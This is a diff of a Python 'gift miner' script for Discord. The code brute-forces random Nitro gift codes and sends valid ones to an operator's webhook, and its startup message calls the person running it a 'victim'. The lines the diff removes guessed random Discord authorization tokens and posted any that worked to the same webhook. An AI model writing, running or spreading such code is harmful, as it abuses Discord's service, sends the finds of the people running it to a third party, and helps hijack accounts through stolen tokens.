@@ -40,34 +40,10 @@ def main(URLWEBHOOK):
 		valid = 0
 		novalid = 0
 
-		it = 0
-		tvalid = 0
-		tnovalid = 0
-
 		webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'Жертва запустила гифт майнер')
 		response = webhook.execute()
 
 		while True:
-			it +=1
-			TokenChars = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbm0123456789-_"
-							
-
-
-			one = ''.join((random.choice(TokenChars) for i in range(24)))
-			two = ''.join((random.choice(TokenChars) for i in range(6)))
-			three = ''.join((random.choice(TokenChars) for i in range(27)))
-
-			token = f"{one}.{two}.{three}"
-
-			response = post(f'https://discord.com/api/v6/invite/{randint(1,9999999)}', headers={'Authorization': token})
-
-			if response.status_code == 401:
-				it += 1
-			elif "You need to verify your account in order to perform this action." in str(response.content):
-				it += 1
-			else:
-				webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'||{token}|| - valid | Invalid - ||{it}||')
-				response = webhook.execute()
 
 			code = "".join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase,k = 16))
 							
@@ -79,9 +55,9 @@ def main(URLWEBHOOK):
 			if r.status_code == 200:
 				webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'||{nitro}||')
 				response = webhook.execute()
-				tvalid += 1
+				valid += 1
 			else:
-				tnovalid += 1
+				novalid += 1
 				continue
 			if i == 10000:
 				webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'из {i} - {novalid} Invalid | ||{valid}|| Valid')
